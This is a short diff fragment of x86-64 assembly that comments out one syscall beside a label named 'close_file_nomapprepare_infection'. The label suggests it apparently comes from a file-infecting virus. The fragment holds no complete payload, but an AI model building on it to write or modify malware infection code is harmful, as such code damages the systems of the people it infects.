@@ -115,7 +115,7 @@
 		mov		rsi, [rbp + 16]
 		add		rsi, mydata.file_size
 		mov		rsi, [rsi]
-		syscall
+		;syscall
 	.close_file_nomapprepare_infection:
 		mov		rax, SYS_close
 		mov		rdi, r12
